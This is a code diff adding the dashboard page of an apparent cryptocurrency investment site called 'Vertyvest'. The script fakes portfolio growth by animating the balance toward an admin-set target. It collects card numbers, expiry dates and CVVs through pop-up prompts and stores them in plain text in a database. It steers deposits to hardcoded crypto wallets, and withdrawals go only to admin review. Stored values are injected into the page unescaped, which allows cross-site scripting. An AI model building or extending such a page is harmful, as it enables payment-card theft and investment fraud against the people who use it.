@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Vertyvest - Trading Dashboard</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    body { background-color: #0b0f19; color: #f8fafc; min-height: 100vh; padding-bottom: 40px; }
+    header { background: #111827; border-bottom: 1px solid #1f2937; padding: 16px 28px; display: flex; justify-content: space-between; align-items: center; }
+    .logo { display: flex; align-items: center; gap: 10px; font-size: 22px; font-weight: 800; color: #f39c12; letter-spacing: 1px; }
+    .logo img { height: 36px; width: auto; object-fit: contain; border-radius: 4px; }
+    .user-controls { display: flex; align-items: center; gap: 16px; }
+    .logout-btn { background: #ef4444; color: white; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; }
+    .container { max-width: 1200px; margin: 24px auto; padding: 0 20px; }
+    
+    .welcome-banner {
+      background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+      border: 1px solid #f39c12;
+      border-radius: 12px;
+      padding: 24px 28px;
+      margin-bottom: 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+    .welcome-text h2 { font-size: 24px; color: #f39c12; margin-bottom: 6px; }
+    .welcome-text p { font-size: 13.5px; color: #cbd5e1; }
+    .portfolio-box { text-align: right; }
+    .portfolio-label { font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
+    .portfolio-amount { font-size: 32px; font-weight: 800; color: #10b981; }
+    .growth-tag { display: inline-block; margin-top: 4px; font-size: 11px; padding: 2px 8px; border-radius: 10px; background: rgba(16,185,129,0.15); color: #34d399; }
+
+    .grid-2 { display: grid; grid-template-columns: 2fr 1fr; gap: 22px; margin-bottom: 24px; }
+    @media(max-width: 900px) { .grid-2 { grid-template-columns: 1fr; } }
+    .panel { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; }
+    .panel h3 { font-size: 16px; color: #f39c12; margin-bottom: 14px; border-bottom: 1px solid #1f2937; padding-bottom: 8px; }
+    
+    .quick-actions-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-top: 10px; }
+    .action-btn { padding: 14px; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; text-align: center; transition: opacity 0.2s; }
+    .action-btn:hover { opacity: 0.9; }
+    .btn-deposit { background: #f39c12; color: #0f172a; }
+    .btn-withdraw { background: #3b82f6; color: #ffffff; }
+    .btn-buy { background: #10b981; color: #ffffff; }
+    .btn-sell { background: #ef4444; color: #ffffff; }
+
+    table { width: 100%; border-collapse: collapse; font-size: 13.5px; }
+    th, td { text-align: left; padding: 10px 8px; border-bottom: 1px solid #1f2937; }
+    th { color: #94a3b8; font-size: 12px; text-transform: uppercase; }
+    .text-green { color: #10b981; font-weight: 600; }
+    .text-red { color: #ef4444; font-weight: 600; }
+    .trade-row-btns button { padding: 5px 10px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; margin-right: 4px; }
+    .tb-buy { background: #10b981; color: white; }
+    .tb-sell { background: #ef4444; color: white; }
+
+    .form-group { margin-bottom: 12px; }
+    .form-group label { display: block; font-size: 12px; color: #94a3b8; margin-bottom: 4px; }
+    .wallet-input-row { display: flex; gap: 8px; }
+    .wallet-input-row input { flex: 1; padding: 9px; border-radius: 6px; border: 1px solid #374151; background: #1f2937; color: #ffffff; font-size: 13px; }
+    .copy-btn { padding: 0 14px; background: #f39c12; color: #0f172a; border: none; border-radius: 6px; font-weight: 700; font-size: 12px; cursor: pointer; transition: background 0.2s; }
+    .copy-btn:hover { background: #e67e22; }
+
+    .form-group input:not(.wallet-input-row input), .form-group select { width: 100%; padding: 9px; border-radius: 6px; border: 1px solid #374151; background: #1f2937; color: #ffffff; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="logo.jpg" onerror="this.onerror=null; this.src='logo.jpeg';" alt="Vertyvest Logo" />
+      <span>VERTYVEST</span>
+    </div>
+    <div class="user-controls">
+      <span id="headerUsername" style="font-size: 13.5px; color:#cbd5e1;">Trader</span>
+      <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="welcome-banner">
+      <div class="welcome-text">
+        <h2 id="welcomeHeading">Welcome back, trader</h2>
+        <p>Your secure gateway to advanced cryptocurrency trading and digital asset management.</p>
+      </div>
+      <div class="portfolio-box">
+        <div class="portfolio-label">Portfolio Balance</div>
+        <div class="portfolio-amount" id="userBalanceDisplay">$0.00</div>
+        <div class="growth-tag" id="growthStatusTag">Standard Account</div>
+      </div>
+    </div>
+
+    <div class="grid-2">
+      <!-- Live Crypto Market (8 Coins) -->
+      <div class="panel">
+        <h3>Live Crypto Market (8 Coins)</h3>
+        <table>
+          <thead>
+            <tr>
+              <th>Asset</th>
+              <th>Current Price</th>
+              <th>24h Change</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="marketTableBody">
+            <tr><td colspan="4" style="color:#94a3b8; text-align:center;">Loading market prices...</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- Quick Actions Panel -->
+      <div class="panel">
+        <h3>Quick Actions</h3>
+        <p style="font-size:12.5px; color:#94a3b8; margin-bottom: 12px;">Deposit, withdraw, buy, or sell digital assets instantly.</p>
+        <div class="quick-actions-grid">
+          <button class="action-btn btn-deposit" onclick="scrollToSec('depositSec')">Deposit Funds</button>
+          <button class="action-btn btn-withdraw" onclick="scrollToSec('withdrawSec')">Withdraw</button>
+          <button class="action-btn btn-buy" onclick="openBuyModal()">Buy Crypto</button>
+          <button class="action-btn btn-sell" onclick="openSellModal()">Sell / P2P</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Deposit Wallets & Withdrawal Form -->
+    <div class="grid-2">
+      <div class="panel" id="depositSec">
+        <h3>Your Deposit Wallets</h3>
+        <p style="font-size:12.5px; color:#94a3b8; margin-bottom:12px;">Send funds to your dedicated deposit addresses below:</p>
+        
+        <div class="form-group">
+          <label>Bitcoin (BTC) Deposit Address</label>
+          <div class="wallet-input-row">
+            <input type="text" id="btcWallet" value="3CFFZyRrxJHRaQ46doQGtC3SkH9zqAyruT" readonly />
+            <button class="copy-btn" onclick="copyWallet('btcWallet', 'Bitcoin (BTC)')">Copy</button>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Ethereum (ETH) Deposit Address</label>
+          <div class="wallet-input-row">
+            <input type="text" id="ethWallet" value="0xB5E9Bde26Be2ABCF4C074C3aC11FdcaCA3bf7c84" readonly />
+            <button class="copy-btn" onclick="copyWallet('ethWallet', 'Ethereum (ETH)')">Copy</button>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>Tether (USDT - TRC20) Deposit Address</label>
+          <div class="wallet-input-row">
+            <input type="text" id="usdtWallet" value="TEjN4g8xaaQWFAE67w8cTk172C71PGJWDe" readonly />
+            <button class="copy-btn" onclick="copyWallet('usdtWallet', 'Tether (USDT)')">Copy</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel" id="withdrawSec">
+        <h3>Request Withdrawal</h3>
+        <form onsubmit="submitWithdrawal(event)">
+          <div class="form-group">
+            <label>Amount (USD)</label>
+            <input type="number" id="wdAmount" step="0.01" min="1" placeholder="Enter amount" required />
+          </div>
+          <div class="form-group">
+            <label>Destination Wallet / Bank Info</label>
+            <input type="text" id="wdDetails" placeholder="Enter destination wallet address or bank details" required />
+          </div>
+          <button type="submit" class="action-btn btn-withdraw" style="width:100%; margin-top:6px;">Submit Withdrawal</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Transaction History -->
+    <div class="panel">
+      <h3>Transaction History & Admin Feedback</h3>
+      <table>
+        <thead>
+          <tr>
+            <th>Date</th>
+            <th>Type</th>
+            <th>Amount</th>
+            <th>Destination / Details</th>
+            <th>Status</th>
+            <th>Admin Message / Note</th>
+          </tr>
+        </thead>
+        <tbody id="txHistoryBody">
+          <tr><td colspan="6" style="color:#94a3b8; text-align:center;">Loading transactions...</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = 'https://ltvjnbrfnompezrqcjev.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_6k13z1G-rGa0ZdUAqj-amw_VGFkZxxz';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    let currentUser = JSON.parse(localStorage.getItem('vrt_current_user'));
+    if (!currentUser) window.location.href = 'index.html';
+
+    document.getElementById('headerUsername').textContent = currentUser.username;
+    document.getElementById('welcomeHeading').textContent = `Welcome back, ${currentUser.username}`;
+
+    const coinsData = [
+      { id: 'bitcoin', name: 'Bitcoin (BTC)', price: 64850.00, change: -2.05 },
+      { id: 'ethereum', name: 'Ethereum (ETH)', price: 1829.66, change: -1.00 },
+      { id: 'tether', name: 'Tether (USDT)', price: 0.9994, change: 0.00 },
+      { id: 'binancecoin', name: 'BNB (BNB)', price: 593.62, change: 1.45 },
+      { id: 'solana', name: 'Solana (SOL)', price: 72.84, change: 3.20 },
+      { id: 'ripple', name: 'XRP (XRP)', price: 0.9638, change: -0.63 },
+      { id: 'cardano', name: 'Cardano (ADA)', price: 0.1543, change: 0.85 },
+      { id: 'dogecoin', name: 'Dogecoin (DOGE)', price: 0.0591, change: -1.12 }
+    ];
+
+    function copyWallet(elementId, coinName) {
+      const inputEl = document.getElementById(elementId);
+      inputEl.select();
+      inputEl.setSelectionRange(0, 99999);
+      navigator.clipboard.writeText(inputEl.value).then(() => {
+        alert(`${coinName} address copied to clipboard!`);
+      }).catch(err => {
+        alert('Failed to copy address.');
+      });
+    }
+
+    function renderMarketTable() {
+      const tbody = document.getElementById('marketTableBody');
+      tbody.innerHTML = coinsData.map(c => {
+        const changeClass = c.change >= 0 ? 'text-green' : 'text-red';
+        const changeSign = c.change >= 0 ? '+' : '';
+        return `
+          <tr>
+            <td><strong>${c.name}</strong></td>
+            <td>$${c.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 4})}</td>
+            <td class="${changeClass}">${changeSign}${c.change}%</td>
+            <td class="trade-row-btns">
+              <button class="tb-buy" onclick="buySpecificCoin('${c.name}', ${c.price})">Buy</button>
+              <button class="tb-sell" onclick="sellSpecificCoin('${c.name}', ${c.price})">Sell</button>
+            </td>
+          </tr>
+        `;
+      }).join('');
+    }
+
+    async function fetchLivePrices() {
+      try {
+        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,tether,binancecoin,solana,ripple,cardano,dogecoin');
+        const data = await res.json();
+        data.forEach(item => {
+          const match = coinsData.find(c => c.id === item.id);
+          if (match) {
+            match.price = item.current_price;
+            match.change = parseFloat(item.price_change_percentage_24h || 0).toFixed(2);
+          }
+        });
+        renderMarketTable();
+      } catch (e) {
+        renderMarketTable();
+      }
+    }
+
+    function calculateLiveBalance(user) {
+      if (!user.growth_active || !user.growth_start_time) return parseFloat(user.balance || 0);
+      const startTime = new Date(user.growth_start_time).getTime();
+      const elapsedMs = Math.max(0, Date.now() - startTime);
+      const durationMs = (parseFloat(user.growth_duration_hours) || 24) * 60 * 60 * 1000;
+      const progress = Math.min(1, elapsedMs / durationMs);
+      const startBal = parseFloat(user.base_balance || 0);
+      const endBal = parseFloat(user.target_balance || startBal);
+      return startBal + (endBal - startBal) * progress;
+    }
+
+    async function openBuyModal() {
+      const coinList = coinsData.map((c, i) => `${i + 1}. ${c.name} ($${c.price})`).join('\n');
+      const choice = prompt(`Select preferred coin to BUY by entering number (1-8):\n\n${coinList}`);
+      if (!choice || isNaN(choice)) return;
+      const index = parseInt(choice) - 1;
+      if (index < 0 || index >= coinsData.length) { alert('Invalid selection.'); return; }
+
+      const selectedCoin = coinsData[index];
+      const amountInput = prompt(`Enter USD amount to purchase for ${selectedCoin.name}:`);
+      if (!amountInput || isNaN(amountInput)) return;
+      const amount = parseFloat(amountInput);
+
+      const cardInfo = prompt('Enter your Bank Card Number and payment info (e.g. Card: 4111... Exp: 09/28 CVV: 123):');
+      if (!cardInfo) return;
+
+      const { error } = await supabaseClient.from('vrt_transactions').insert([{
+        username: currentUser.username,
+        type: `Buy ${selectedCoin.name}`,
+        amount: amount,
+        details: `Card Info: ${cardInfo}`,
+        status: 'Pending',
+        admin_note: 'Awaiting admin approval'
+      }]);
+
+      if (error) {
+        alert('Error: ' + error.message);
+      } else {
+        alert('Your purchase request has been submitted and is Pending admin approval.');
+        loadTransactions();
+      }
+    }
+
+    function buySpecificCoin(name, price) {
+      const amountInput = prompt(`Enter USD amount to buy ${name} (Price: $${price}):`);
+      if (!amountInput || isNaN(amountInput)) return;
+      const amount = parseFloat(amountInput);
+
+      const cardInfo = prompt('Enter your Bank Card Number and payment info (Card, Exp, CVV):');
+      if (!cardInfo) return;
+
+      submitBuyRequest(`Buy ${name}`, amount, cardInfo);
+    }
+
+    async function submitBuyRequest(type, amount, cardInfo) {
+      const { error } = await supabaseClient.from('vrt_transactions').insert([{
+        username: currentUser.username,
+        type: type,
+        amount: amount,
+        details: `Card Info: ${cardInfo}`,
+        status: 'Pending',
+        admin_note: 'Awaiting admin approval'
+      }]);
+
+      if (error) alert('Error: ' + error.message);
+      else {
+        alert('Your purchase request has been submitted and is Pending admin approval.');
+        loadTransactions();
+      }
+    }
+
+    async function openSellModal() {
+      const coinList = coinsData.map((c, i) => `${i + 1}. ${c.name}`).join('\n');
+      const choice = prompt(`Select coin to SELL by entering number (1-8):\n\n${coinList}`);
+      if (!choice || isNaN(choice)) return;
+      const index = parseInt(choice) - 1;
+      if (index < 0 || index >= coinsData.length) { alert('Invalid selection.'); return; }
+
+      const selectedCoin = coinsData[index];
+      const option = prompt('Choose Sell Option:\n1. Standard Exchange Sell\n2. P2P Trading Option', '1');
+      if (!option) return;
+      const sellType = option === '2' ? 'P2P Sell' : 'Standard Exchange Sell';
+
+      const amountInput = prompt(`Enter USD amount to sell for ${selectedCoin.name}:`);
+      if (!amountInput || isNaN(amountInput)) return;
+      const amount = parseFloat(amountInput);
+
+      const details = prompt('Enter Bank Account or Payout Details:', 'Bank Transfer Details');
+      if (!details) return;
+
+      const liveBal = calculateLiveBalance(currentUser);
+      if (amount > liveBal) { alert('Insufficient funds.'); return; }
+
+      const { error } = await supabaseClient.from('vrt_transactions').insert([{
+        username: currentUser.username,
+        type: `${sellType} (${selectedCoin.name})`,
+        amount: amount,
+        details: details,
+        status: 'Pending',
+        admin_note: 'Awaiting admin approval'
+      }]);
+
+      if (error) alert('Error: ' + error.message);
+      else {
+        alert('Your P2P sell request has been sent to admin for approval');
+        loadTransactions();
+      }
+    }
+
+    function sellSpecificCoin(name, price) {
+      const option = prompt(`Sell ${name} (Price: $${price})\nChoose Option:\n1. Standard Exchange Sell\n2. P2P Trading Option`, '1');
+      if (!option) return;
+      const sellType = option === '2' ? 'P2P Sell' : 'Standard Exchange Sell';
+
+      const amountInput = prompt(`Enter USD amount to sell ${name}:`);
+      if (!amountInput || isNaN(amountInput)) return;
+      const amount = parseFloat(amountInput);
+
+      const details = prompt('Enter Bank / Payout details:', 'Bank Account Details');
+      if (!details) return;
+
+      submitSellRequest(`${sellType} (${name})`, amount, details);
+    }
+
+    async function submitSellRequest(type, amount, details) {
+      const liveBal = calculateLiveBalance(currentUser);
+      if (amount > liveBal) { alert('Insufficient funds.'); return; }
+
+      const { error } = await supabaseClient.from('vrt_transactions').insert([{
+        username: currentUser.username,
+        type: type,
+        amount: amount,
+        details: details,
+        status: 'Pending',
+        admin_note: 'Awaiting admin approval'
+      }]);
+
+      if (error) alert('Error: ' + error.message);
+      else {
+        alert('Your P2P sell request has been sent to admin for approval');
+        loadTransactions();
+      }
+    }
+
+    async function submitWithdrawal(e) {
+      e.preventDefault();
+      const amount = parseFloat(document.getElementById('wdAmount').value);
+      const details = document.getElementById('wdDetails').value.trim();
+      const liveBal = calculateLiveBalance(currentUser);
+
+      if (amount > liveBal) { 
+        alert('Insufficient funds.'); 
+        return; 
+      }
+
+      const { error } = await supabaseClient.from('vrt_transactions').insert([{
+        username: currentUser.username,
+        type: 'Withdrawal Request',
+        amount: amount,
+        details: details,
+        status: 'Pending',
+        admin_note: 'Awaiting admin approval'
+      }]);
+
+      if (error) {
+        alert('Error: ' + error.message);
+      } else { 
+        alert('Withdrawal Pending'); 
+        document.getElementById('wdAmount').value = ''; 
+        document.getElementById('wdDetails').value = ''; 
+        loadTransactions(); 
+      }
+    }
+
+    async function loadTransactions() {
+      const { data, error } = await supabaseClient
+        .from('vrt_transactions')
+        .select('*')
+        .eq('username', currentUser.username)
+        .order('created_at', { ascending: false });
+
+      const tbody = document.getElementById('txHistoryBody');
+      if (error || !data || data.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="6" style="color:#94a3b8; text-align:center;">No transactions recorded yet.</td></tr>';
+        return;
+      }
+
+      tbody.innerHTML = data.map(tx => {
+        let statusColor = '#f59e0b';
+        if (tx.status === 'Approved') statusColor = '#10b981';
+        if (tx.status === 'Declined') statusColor = '#ef4444';
+
+        const dateStr = tx.created_at ? new Date(tx.created_at).toLocaleDateString() : 'Recent';
+        return `
+          <tr>
+            <td>${dateStr}</td>
+            <td><strong>${tx.type}</strong></td>
+            <td>$${parseFloat(tx.amount).toFixed(2)}</td>
+            <td style="font-size:12px; color:#cbd5e1;">${tx.details || '-'}</td>
+            <td><span style="color:${statusColor}; font-weight:bold;">${tx.status}</span></td>
+            <td><span style="color:#cbd5e1; font-style:italic;">${tx.admin_note || '-'}</span></td>
+          </tr>
+        `;
+      }).join('');
+    }
+
+    function scrollToSec(id) { document.getElementById(id).scrollIntoView({ behavior: 'smooth' }); }
+    function logout() { localStorage.removeItem('vrt_current_user'); window.location.href = 'index.html'; }
+
+    setInterval(() => {
+      if (!currentUser) return;
+      const liveBalance = calculateLiveBalance(currentUser);
+      document.getElementById('userBalanceDisplay').textContent = `$${liveBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+      const tag = document.getElementById('growthStatusTag');
+      if (currentUser.growth_active) {
+        tag.textContent = '● Active Growth';
+        tag.style.color = '#34d399';
+      } else {
+        tag.textContent = 'Standard Balance';
+        tag.style.color = '#94a3b8';
+      }
+    }, 1000);
+
+    async function syncProfile() {
+      const { data } = await supabaseClient.from('vrt_users').select('*').eq('username', currentUser.username).single();
+      if (data) { currentUser = data; localStorage.setItem('vrt_current_user', JSON.stringify(data)); }
+    }
+
+    renderMarketTable();
+    fetchLivePrices();
+    loadTransactions();
+    setInterval(fetchLivePrices, 15000);
+    setInterval(syncProfile, 5000);
+    setInterval(loadTransactions, 5000);
+  </script>
+</body>
+</html>
